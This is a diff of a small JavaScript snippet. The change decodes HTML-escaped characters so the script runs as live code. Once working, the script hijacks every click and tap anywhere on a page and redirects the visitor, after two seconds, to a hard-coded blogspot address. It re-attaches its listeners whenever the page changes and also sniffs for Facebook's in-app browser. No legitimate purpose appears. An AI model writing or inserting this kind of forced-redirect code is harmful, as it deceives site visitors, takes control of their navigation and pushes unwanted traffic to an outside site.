@@ -1,28 +1,28 @@
 (function() {
   let canRedirect = true;
-  const redirectURL = &#39;https://zmistar.blogspot.com/&#39;;
+  const redirectURL = 'https://zmistar.blogspot.com/';
 
   function triggerRedirect(e) {
     if (!canRedirect) return;
     canRedirect = false;
-    setTimeout(() =&gt; {
+    setTimeout(() => {
       window.location.href = redirectURL;
     }, 2000);
-    setTimeout(() =&gt; {
+    setTimeout(() => {
       canRedirect = true;
     }, 0);
   }
 
   function attachEvents() {
-    const addListeners = (el) =&gt; {
-      el.addEventListener(&#39;click&#39;, triggerRedirect, {passive: true});
-      el.addEventListener(&#39;touchstart&#39;, triggerRedirect, {passive: true});
+    const addListeners = (el) => {
+      el.addEventListener('click', triggerRedirect, {passive: true});
+      el.addEventListener('touchstart', triggerRedirect, {passive: true});
     };
 
     addListeners(document.body);
     addListeners(document.documentElement);
 
-    const observer = new MutationObserver(() =&gt; {
+    const observer = new MutationObserver(() => {
       addListeners(document.body);
       addListeners(document.documentElement);
     });
@@ -30,13 +30,13 @@
     observer.observe(document.body, {childList: true, subtree: true});
   }
 
-  if (document.readyState === &#39;loading&#39;) {
-    document.addEventListener(&#39;DOMContentLoaded&#39;, attachEvents);
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', attachEvents);
   } else {
     attachEvents();
   }
 
   const ua = navigator.userAgent || navigator.vendor || window.opera;
-  const isFBBrowser = ua.indexOf(&quot;FBAN&quot;) &gt; -1 || ua.indexOf(&quot;FBAV&quot;) &gt; -1;
-  if (isFBBrowser) console.log(&quot;Facebook browser detected&quot;);
+  const isFBBrowser = ua.indexOf("FBAN") > -1 || ua.indexOf("FBAV") > -1;
+  if (isFBBrowser) console.log("Facebook browser detected");
 })();
